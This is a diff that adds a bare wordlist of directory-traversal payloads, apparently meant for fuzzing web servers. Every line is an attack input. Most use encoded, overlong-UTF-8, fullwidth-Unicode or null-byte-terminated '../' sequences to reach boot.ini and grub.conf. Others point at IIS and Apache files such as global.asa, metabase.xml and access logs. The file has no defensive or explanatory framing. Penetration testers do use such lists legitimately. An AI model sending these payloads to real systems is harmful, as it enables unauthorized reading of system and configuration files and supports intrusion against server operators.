@@ -1,0 +1,39 @@
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+/boot/grub/grub.conf
+/./././././././././././boot.ini
+/../../../../../../../../../../../boot.ini
+/..\../..\../..\../..\../..\../..\../boot.ini
+/.\\./.\\./.\\./.\\./.\\./.\\./boot.ini
+..//..//..//..//..//boot.ini
+../../../../../../../../../../../../boot.ini
+../../boot.ini
+..\../..\../..\../..\../boot.ini
+..\../..\../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+\..\..\..\..\..\..\..\..\..\..\boot.ini
+/../../../../../../../../../../../boot.ini%00
+../../../../../../../../../../../../boot.ini%00
+..\..\..\..\..\..\..\..\..\..\boot.ini%00
+/../../../../../../../../../../../boot.ini%00.html
+/../../../../../../../../../../../boot.ini%00.jpg
+..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
+c:\apache\logs\access.log
+c:\apache\logs\error.log
+c:\AppServ\MySQL
+C:/boot.ini
+C:\boot.ini
+/C:/inetpub/ftproot/
+C:/inetpub/wwwroot/global.asa
+C:\inetpub\wwwroot\global.asa
+c:\inetpub\wwwroot\index.asp
+/C:\Program Files\
+c:\Program Files\Apache Group\Apache\logs\access.log
+c:\Program Files\Apache Group\Apache\logs\error.log
+c:\System32\Inetsrv\metabase.xml
+c:WINDOWS/system32/
+/var/adm/ras/bootlog
+/var/log/boot.log
+..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8boot.ini
+..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bcboot.ini
